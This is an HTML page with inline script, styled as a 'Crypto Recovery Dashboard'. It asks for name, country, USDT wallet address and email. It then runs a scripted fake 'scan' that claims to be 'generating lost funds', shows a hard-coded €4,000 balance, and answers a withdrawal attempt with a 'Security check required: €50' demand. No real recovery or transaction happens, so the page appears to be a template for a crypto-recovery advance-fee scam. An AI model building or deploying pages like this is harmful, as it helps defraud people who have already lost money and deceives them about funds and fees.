<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Crypto Recovery Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #0a2342;
      --secondary: #183d5d;
      --accent: #01c3ff;
      --accent2: #2ed8a7;
      --yellow: #f0b90b;
      --success: #19f3be;
      --danger: #ff4d4d;
      --card-bg: #12203a;
      --input-bg: #192a46;
      --shadow: 0 8px 32px 0 rgba(2,30,66,0.22);
      --radius: 18px;
      --blur: blur(8px);
    }
    html, body {
      margin: 0; padding: 0;
      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(120deg, #142850 0%, #27496d 100%);
      min-height: 100vh;
      color: #fff;
      letter-spacing: 0.01em;
    }
    .container {
      max-width: 420px;
      margin: 60px auto 0 auto;
      padding: 36px 28px;
      background: rgba(18,32,58,0.98);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      backdrop-filter: var(--blur);
      position: relative;
      z-index: 1;
      animation: fadeIn 1.1s cubic-bezier(.3,.58,.7,1.04);
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px);}
      to { opacity: 1; transform: translateY(0);}
    }
    h2 {
      text-align: center;
      font-weight: 700;
      color: var(--accent);
      margin-bottom: 25px;
      font-size: 2em;
      letter-spacing: 0.03em;
    }
    label {
      font-weight: 600;
      font-size: 1.03em;
      margin-bottom: 7px;
      display: block;
      color: #b2cae8;
    }
    input, select, button {
      width: 100%;
      padding: 14px;
      margin: 12px 0 22px 0;
      border: none;
      border-radius: 9px;
      font-size: 1.06em;
      background: var(--input-bg);
      color: #fff;
      outline: none;
      transition: background 0.15s, box-shadow 0.15s;
    }
    select:focus, input:focus {
      background: #20345c;
      box-shadow: 0 0 0 2px var(--accent);
    }
    button {
      background: linear-gradient(90deg, var(--accent) 60%, var(--accent2));
      color: #0a2342;
      font-weight: 700;
      font-size: 1.1em;
      letter-spacing: 0.03em;
      cursor: pointer;
      margin-top: 10px;
      box-shadow: 0 3px 16px 0 rgba(1,195,255,0.09);
      transition: background 0.22s, color 0.22s, box-shadow 0.22s;
    }
    button:active {
      background: linear-gradient(90deg, var(--accent2), var(--accent));
      color: #fff;
      box-shadow: 0 3px 16px 0 rgba(1,195,255,0.22);
    }
    button:disabled {
      background: #6c7a92;
      color: #d7e4f7;
      cursor: not-allowed;
    }
    .hidden { display: none; }
    /* Progress Bar */
    .progress-bar-bg {
      width: 100%; height: 11px;
      background: #20345c;
      border-radius: 7px;
      margin: 20px 0 28px 0;
      overflow: hidden;
    }
    .progress-bar-fill {
      height: 100%;
      width: 0;
      background: linear-gradient(90deg, var(--accent), var(--accent2));
      transition: width 0.5s cubic-bezier(.3,.58,.7,1.04);
    }
    .activity {
      text-align: center;
      font-size: 1.15em;
      color: #b7d3f6;
      margin-bottom: 16px;
    }
    .scan-steps {
      margin: 18px 0 10px 0;
      padding: 0;
      list-style: none;
    }
    .scan-step {
      background: #174074;
      border-left: 5px solid var(--accent2);
      margin: 7px 0;
      padding: 12px 18px;
      border-radius: 8px;
      font-size: 1.01em;
      animation: fadeInStep 0.5s;
    }
    @keyframes fadeInStep {
      from { opacity: 0; transform: translateY(14px);}
      to { opacity: 1; transform: translateY(0);}
    }
    .success {
      color: var(--success);
      font-weight: 700;
      text-align: center;
      margin: 22px 0 10px 0;
      font-size: 1.23em;
    }
    .balance {
      font-size: 2.0em;
      text-align: center;
      margin: 24px 0 12px 0;
      color: var(--accent2);
      font-weight: 700;
      letter-spacing: 0.04em;
    }
    .stamp {
      margin-top: 18px;
      text-align: center;
      font-size: 1.22em;
      color: var(--yellow);
      font-weight: 700;
      letter-spacing: 0.02em;
    }
    /* MODAL */
    .modal-bg {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(20,40,80,0.56);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10;
      animation: fadeInModal 0.4s;
    }
    @keyframes fadeInModal {
      from { opacity: 0;}
      to { opacity: 1;}
    }
    .modal {
      background: #162b51;
      padding: 32px 26px;
      border-radius: 22px;
      box-shadow: 0 8px 32px 0 rgba(2,30,66,0.18);
      min-width: 330px;
      max-width: 95vw;
      text-align: center;
      position: relative;
      z-index: 11;
      animation: fadeIn 0.3s;
    }
    .modal .modal-title {
      font-size: 1.31em;
      color: var(--accent2);
      font-weight: 700;
      margin-bottom: 19px;
      letter-spacing: 0.01em;
    }
    .modal .modal-details {
      color: #a3b9d1;
      margin-bottom: 19px;
      font-size: 1.13em;
      letter-spacing: 0.01em;
    }
    .modal .close-btn {
      position: absolute;
      top: 9px; right: 14px;
      background: none; border: none; color: #9fb4d7;
      font-size: 1.7em; font-weight: bold; cursor: pointer;
      transition: color 0.18s;
    }
    .modal .close-btn:hover {
      color: var(--accent);
    }
    /* Error Popup */
    .error-popup-bg {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(20,40,80,0.65);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 100;
      animation: fadeInModal 0.35s;
    }
    .error-popup {
      background: #1e233a;
      padding: 30px 26px;
      border-radius: 18px;
      box-shadow: 0 8px 32px 0 rgba(255,77,77,0.15);
      min-width: 310px;
      max-width: 90vw;
      text-align: center;
      border: 2px solid var(--danger);
      color: var(--danger);
      font-weight: 700;
      font-size: 1.1em;
      animation: fadeIn 0.2s;
    }
    .error-popup button {
      margin-top: 22px;
      background: var(--danger);
      color: #fff;
      font-size: 1em;
      border-radius: 7px;
      padding: 10px 0;
      border: none;
      font-weight: 700;
      cursor: pointer;
      width: 60%;
      transition: background 0.19s;
    }
    .error-popup button:hover {
      background: #e03838;
    }
    /* Snackbar/Toast */
    #snackbar {
      visibility: hidden;
      min-width: 220px;
      background-color: #152b51;
      color: #fff;
      text-align: center;
      border-radius: 9px;
      padding: 15px;
      position: fixed;
      left: 50%;
      bottom: 36px;
      transform: translateX(-50%);
      font-size: 1.08em;
      z-index: 300;
      box-shadow: 0 3px 12px 0 rgba(1,195,255,0.14);
      opacity: 0;
      transition: opacity 0.3s, visibility 0.3s;
    }
    #snackbar.show {
      visibility: visible;
      opacity: 1;
    }
    @media (max-width: 600px) {
      .container {
        margin: 18px auto;
        padding: 18px 6vw;
      }
      .modal, .error-popup {
        min-width: 90vw;
        padding: 18px 5vw;
      }
    }
  </style>
</head>
<body>
  <div class="container" id="registration">
    <h2>Crypto Recovery Registration</h2>
    <label for="country">Country</label>
    <select id="country">
      <option value="">Select your country</option>
      <option value="USA">United States</option>
      <option value="UK">United Kingdom</option>
      <option value="Nigeria">Nigeria</option>
      <option value="Other">Other</option>
    </select>
    <label for="name">Full Name</label>
    <input type="text" id="name" placeholder="Enter your full name" autocomplete="name"/>
    <label for="usdt">USDT Address</label>
    <input type="text" id="usdt" placeholder="Your USDT wallet address" autocomplete="off"/>
    <label for="email">Email Address</label>
    <input type="email" id="email" placeholder="Enter your email" autocomplete="email"/>
    <button onclick="register()">Register & Continue</button>
  </div>

  <div class="container hidden" id="dashboard">
    <h2>Welcome Back</h2>
    <div class="activity" id="greeting"></div>
    <button id="recoveryBtn" onclick="startRecovery()">Start Recovery</button>
    <div class="progress-bar-bg hidden" id="progressBarBg">
      <div class="progress-bar-fill" id="progressBarFill"></div>
    </div>
    <ul id="scanSteps" class="scan-steps"></ul>
    <div id="finalMessage" class="success hidden">üéâ Congratulations, your recovery is complete!</div>
    <div class="balance hidden" id="balance">‚Ç¨4,000.00</div>
    <button class="hidden" id="withdrawBtn" onclick="openWithdrawModal()">Withdraw in USDC</button>
    <div class="stamp hidden" id="stamp">‚úÖ Final Payment Confirmation Stamp</div>
  </div>

  <!-- Transaction Modal -->
  <div class="modal-bg hidden" id="modalBg">
    <div class="modal" id="transactionModal">
      <button class="close-btn" onclick="closeModal()">&times;</button>
      <div class="modal-title">Withdraw USDC</div>
      <div class="modal-details">
        <div><b>Amount:</b> 4,000 USDC</div>
        <div><b>Network:</b> Ethereum</div>
        <div><b>Recipient:</b> <span id="modalRecipient"></span></div>
      </div>
      <button onclick="confirmWithdrawal()">Confirm Withdrawal</button>
    </div>
  </div>

  <!-- Error Popup -->
  <div class="error-popup-bg hidden" id="errorPopupBg">
    <div class="error-popup">
      ‚ö†Ô∏è Security check required: ‚Ç¨50<br>
      <button onclick="closeErrorPopup()">OK, Got it</button>
    </div>
  </div>

  <!-- Snackbar/Toast -->
  <div id="snackbar"></div>

  <script>
    // DOM references
    const registrationDiv = document.getElementById('registration');
    const dashboardDiv = document.getElementById('dashboard');
    const greeting = document.getElementById('greeting');
    const scanSteps = document.getElementById('scanSteps');
    const finalMessage = document.getElementById('finalMessage');
    const balanceDisplay = document.getElementById('balance');
    const withdrawBtn = document.getElementById('withdrawBtn');
    const progressBarBg = document.getElementById('progressBarBg');
    const progressBarFill = document.getElementById('progressBarFill');
    const stamp = document.getElementById('stamp');

    const modalBg = document.getElementById('modalBg');
    const modalRecipient = document.getElementById('modalRecipient');
    const snackbar = document.getElementById('snackbar');
    const errorPopupBg = document.getElementById('errorPopupBg');

    const steps = [
      "Checking previous blockchain activities...",
      "Generating lost funds for your profile...",
      "Loading blockchain database...",
      "Refreshing wallet info...",
      "Posting your profile securely to the blockchain...",
      "Selecting crypto for payout...",
      "USDC SELECTED ‚úÖ",
      "Completing scan details...",
      "Finalizing user recovery..."
    ];

    let username = "", usdtAddr = "";

    // On page load, check for registration
    if (localStorage.getItem('registered')) {
      username = localStorage.getItem('name');
      usdtAddr = localStorage.getItem('usdt');
      showDashboard();
    }

    function register() {
      const country = document.getElementById('country').value;
      username = document.getElementById('name').value.trim();
      usdtAddr = document.getElementById('usdt').value.trim();
      const email = document.getElementById('email').value.trim();
      if (!country || !username || !usdtAddr || !email) {
        showToast("Please fill all fields.", "error");
        return;
      }
      localStorage.setItem('registered', true);
      localStorage.setItem('name', username);
      localStorage.setItem('usdt', usdtAddr);
      showToast("Welcome, " + username + "!", "success");
      setTimeout(() => showDashboard(), 950);
    }

    function showDashboard() {
      registrationDiv.classList.add('hidden');
      dashboardDiv.classList.remove('hidden');
      greeting.textContent = `Dear ${username}, you have 1 ongoing recovery activity.`;
    }

    function startRecovery() {
      scanSteps.innerHTML = "";
      progressBarBg.classList.remove('hidden');
      let idx = 0;
      let stepsCompleted = 0;
      let total = steps.length;
      progressBarFill.style.width = "0%";
      scanSteps.style.opacity = "1";
      withdrawBtn.classList.add('hidden');
      finalMessage.classList.add('hidden');
      balanceDisplay.classList.add('hidden');
      stamp.classList.add('hidden');
      // Animate steps + progress bar
      function nextStep() {
        if (idx < steps.length) {
          // Animate progress
          stepsCompleted++;
          progressBarFill.style.width = ((stepsCompleted/total)*100) + "%";
          // Show step
          const li = document.createElement('li');
          li.className = "scan-step";
          li.textContent = steps[idx];
          scanSteps.appendChild(li);
          idx++;
          setTimeout(nextStep, 850);
        } else {
          // All steps done
          setTimeout(() => {
            finalMessage.classList.remove('hidden');
            balanceDisplay.classList.remove('hidden');
            withdrawBtn.classList.remove('hidden');
            showToast("Recovery complete. Withdraw your funds!", "success");
          }, 900);
        }
      }
      nextStep();
    }

    function openWithdrawModal() {
      modalRecipient.textContent = usdtAddr || localStorage.getItem('usdt') || "[Your USDT Address]";
      modalBg.classList.remove('hidden');
    }
    function closeModal() {
      modalBg.classList.add('hidden');
    }

    function confirmWithdrawal() {
      closeModal();
      setTimeout(() => {
        errorPopupBg.classList.remove('hidden');
      }, 420);
    }

    function closeErrorPopup() {
      errorPopupBg.classList.add('hidden');
      setTimeout(() => {
        stamp.classList.remove('hidden');
        showToast("Final payment confirmed. Withdrawal processed.", "success");
      }, 700);
    }

    // Snackbar/Toast
    function showToast(msg, type="info") {
      snackbar.textContent = msg;
      snackbar.className = "show";
      snackbar.style.backgroundColor =
        type === "success" ? "#20345c"
      : type === "error" ? "#35213a"
      : "#152b51";
      setTimeout(() => { snackbar.className = snackbar.className.replace("show", ""); }, 2500);
    }
  </script>
</body>
</html>
